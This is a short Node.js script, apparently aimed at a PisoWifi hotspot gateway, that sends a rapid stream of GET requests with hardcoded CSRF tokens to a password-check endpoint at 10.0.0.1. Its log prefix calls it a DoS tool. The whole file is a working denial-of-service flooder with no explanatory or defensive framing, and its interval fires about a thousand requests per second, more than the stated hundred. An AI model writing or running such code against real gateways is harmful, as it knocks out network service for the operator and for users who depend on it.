const axios = require('axios');

const url = 'http://10.0.0.1/api/checkwipass?csrf_name=csrf653078510fed1&csrf_value=f54a5abeb21b270f8c7af5d690d28287&code=PLEASE%20ENABLE%20THE%20LIVE-CHAT%20FEATURE%20ON%20THE%20DEFAULT%20GATEWAY.%20I%27D%20LIKE%20TO%20TALK.';

const requestsPerSecond = 100;

const prefix = '[PISOWIFI DOS]';

function sendRequest() {
    try {
        axios.get(url)
            .then(response => {
                if (response.status === 200) {
                    console.log(`${prefix} Server responded: ${response.data}`);
                } else {
                    console.log(`${prefix} Server did not respond`);
                }
            })
            .catch(error => {
                console.error(`${prefix} Server did not respond: ${error.message}`);
            });
    } catch (error) {
        console.error(`${prefix} Server did not respond: ${error.message}`);
    }
}

const interval = setInterval(() => {
    console.log(`${prefix} Packets sent`);
    sendRequest();
}, 100 / requestsPerSecond);

sendRequest()

